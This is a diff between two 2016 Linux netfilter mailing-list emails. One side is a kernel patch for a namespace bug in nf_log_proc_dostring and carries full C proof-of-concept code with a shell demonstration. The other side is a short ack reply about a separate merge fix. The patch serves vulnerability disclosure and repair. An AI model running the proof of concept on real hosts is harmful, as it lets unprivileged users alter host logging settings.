@@ -1,146 +1,49 @@
 From: Pablo Neira Ayuso <pablo@netfilter.org>
-Subject: [PATCH 4/5] netfilter: fix namespace handling in nf_log_proc_dostring
-Date: Thu,  6 Oct 2016 02:07:48 +0200
-Message-ID: <1475712469-17000-5-git-send-email-pablo@netfilter.org>
-References: <1475712469-17000-1-git-send-email-pablo@netfilter.org>
-Cc: davem@davemloft.net, netdev@vger.kernel.org
-To: netfilter-devel@vger.kernel.org
+Subject: Re: [GIT] Networking
+Date: Thu, 6 Oct 2016 02:09:45 +0200
+Message-ID: <20161006000945.GA18976@salvia>
+References: <20161005.014437.1946431553783736769.davem@davemloft.net>
+ <20161006092947.25ae781c@canb.auug.org.au>
+ <CA+55aFzbHD95PMUk4JQfAVkDDRcwzZ6vfvMR60tZnQNSwkDE6A@mail.gmail.com>
+Mime-Version: 1.0
+Content-Type: text/plain; charset=us-ascii
+Cc: Stephen Rothwell <sfr@canb.auug.org.au>,
+        David Miller <davem@davemloft.net>,
+        NetFilter <netfilter-devel@vger.kernel.org>,
+        Network Development <netdev@vger.kernel.org>,
+        Linux Kernel Mailing List <linux-kernel@vger.kernel.org>,
+        Liping Zhang <liping.zhang@spreadtrum.com>
+To: Linus Torvalds <torvalds@linux-foundation.org>
 Return-path: <netfilter-devel-owner@vger.kernel.org>
-In-Reply-To: <1475712469-17000-1-git-send-email-pablo@netfilter.org>
+Content-Disposition: inline
+In-Reply-To: <CA+55aFzbHD95PMUk4JQfAVkDDRcwzZ6vfvMR60tZnQNSwkDE6A@mail.gmail.com>
 Sender: netfilter-devel-owner@vger.kernel.org
 List-Id: netdev.vger.kernel.org
 
-From: Jann Horn <jann@thejh.net>
+On Wed, Oct 05, 2016 at 03:37:17PM -0700, Linus Torvalds wrote:
+> On Wed, Oct 5, 2016 at 3:29 PM, Stephen Rothwell <sfr@canb.auug.org.au> wrote:
+> >
+> > I have been carrying the following merge fix patch (for the merge of
+> > the net-next tree with Linus' tree) for a while now which seems to have
+> > got missed:
+> 
+> Ugh. It doesn't seem to be a merge error, because that double iph
+> assignment came from the original patch that introduced this function:
+> commit ddc8b6027ad0 ("netfilter: introduce nft_set_pktinfo_{ipv4,
+> ipv6}_validate()").
+> 
+> So I wouldn't call it a merge error - it just looks like a bug in the
+> network layer. So I'm not going to apply your patch even though it
+> looks plausible to me, simply because it's outside my area of
+> expertise.
+> 
+> David? Pablo?
 
-nf_log_proc_dostring() used current's network namespace instead of the one
-corresponding to the sysctl file the write was performed on. Because the
-permission check happens at open time and the nf_log files in namespaces
-are accessible for the namespace owner, this can be abused by an
-unprivileged user to effectively write to the init namespace's nf_log
-sysctls.
+This looks good, please take it so we speed up things.
 
-Stash the "struct net *" in extra2 - data and extra1 are already used.
+Acked-by: Pablo Neira Ayuso <pablo@netfilter.org>
 
-Repro code:
+Thanks!
 
-#define _GNU_SOURCE
-#include <stdlib.h>
-#include <sched.h>
-#include <err.h>
-#include <sys/mount.h>
-#include <sys/types.h>
-#include <sys/wait.h>
-#include <fcntl.h>
-#include <unistd.h>
-#include <string.h>
-#include <stdio.h>
-
-char child_stack[1000000];
-
-uid_t outer_uid;
-gid_t outer_gid;
-int stolen_fd = -1;
-
-void writefile(char *path, char *buf) {
-        int fd = open(path, O_WRONLY);
-        if (fd == -1)
-                err(1, "unable to open thing");
-        if (write(fd, buf, strlen(buf)) != strlen(buf))
-                err(1, "unable to write thing");
-        close(fd);
-}
-
-int child_fn(void *p_) {
-        if (mount("proc", "/proc", "proc", MS_NOSUID|MS_NODEV|MS_NOEXEC,
-                  NULL))
-                err(1, "mount");
-
-        /* Yes, we need to set the maps for the net sysctls to recognize us
-         * as namespace root.
-         */
-        char buf[1000];
-        sprintf(buf, "0 %d 1\n", (int)outer_uid);
-        writefile("/proc/1/uid_map", buf);
-        writefile("/proc/1/setgroups", "deny");
-        sprintf(buf, "0 %d 1\n", (int)outer_gid);
-        writefile("/proc/1/gid_map", buf);
-
-        stolen_fd = open("/proc/sys/net/netfilter/nf_log/2", O_WRONLY);
-        if (stolen_fd == -1)
-                err(1, "open nf_log");
-        return 0;
-}
-
-int main(void) {
-        outer_uid = getuid();
-        outer_gid = getgid();
-
-        int child = clone(child_fn, child_stack + sizeof(child_stack),
-                          CLONE_FILES|CLONE_NEWNET|CLONE_NEWNS|CLONE_NEWPID
-                          |CLONE_NEWUSER|CLONE_VM|SIGCHLD, NULL);
-        if (child == -1)
-                err(1, "clone");
-        int status;
-        if (wait(&status) != child)
-                err(1, "wait");
-        if (!WIFEXITED(status) || WEXITSTATUS(status) != 0)
-                errx(1, "child exit status bad");
-
-        char *data = "NONE";
-        if (write(stolen_fd, data, strlen(data)) != strlen(data))
-                err(1, "write");
-        return 0;
-}
-
-Repro:
-
-$ gcc -Wall -o attack attack.c -std=gnu99
-$ cat /proc/sys/net/netfilter/nf_log/2
-nf_log_ipv4
-$ ./attack
-$ cat /proc/sys/net/netfilter/nf_log/2
-NONE
-
-Because this looks like an issue with very low severity, I'm sending it to
-the public list directly.
-
-Signed-off-by: Jann Horn <jann@thejh.net>
-Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>
----
- net/netfilter/nf_log.c | 6 ++++--
- 1 file changed, 4 insertions(+), 2 deletions(-)
-
-diff --git a/net/netfilter/nf_log.c b/net/netfilter/nf_log.c
-index 30a17d649a83..3dca90dc24ad 100644
---- a/net/netfilter/nf_log.c
-+++ b/net/netfilter/nf_log.c
-@@ -422,7 +422,7 @@ static int nf_log_proc_dostring(struct ctl_table *table, int write,
- 	char buf[NFLOGGER_NAME_LEN];
- 	int r = 0;
- 	int tindex = (unsigned long)table->extra1;
--	struct net *net = current->nsproxy->net_ns;
-+	struct net *net = table->extra2;
- 
- 	if (write) {
- 		struct ctl_table tmp = *table;
-@@ -476,7 +476,6 @@ static int netfilter_log_sysctl_init(struct net *net)
- 				 3, "%d", i);
- 			nf_log_sysctl_table[i].procname	=
- 				nf_log_sysctl_fnames[i];
--			nf_log_sysctl_table[i].data = NULL;
- 			nf_log_sysctl_table[i].maxlen = NFLOGGER_NAME_LEN;
- 			nf_log_sysctl_table[i].mode = 0644;
- 			nf_log_sysctl_table[i].proc_handler =
-@@ -486,6 +485,9 @@ static int netfilter_log_sysctl_init(struct net *net)
- 		}
- 	}
- 
-+	for (i = NFPROTO_UNSPEC; i < NFPROTO_NUMPROTO; i++)
-+		table[i].extra2 = net;
-+
- 	net->nf.nf_log_dir_header = register_net_sysctl(net,
- 						"net/netfilter/nf_log",
- 						table);
--- 
-2.1.4
-
+P.S: Sorry for not addressing this any sooner, traveling overhead,
+conferente and unstable wifi connection has been a problem here.
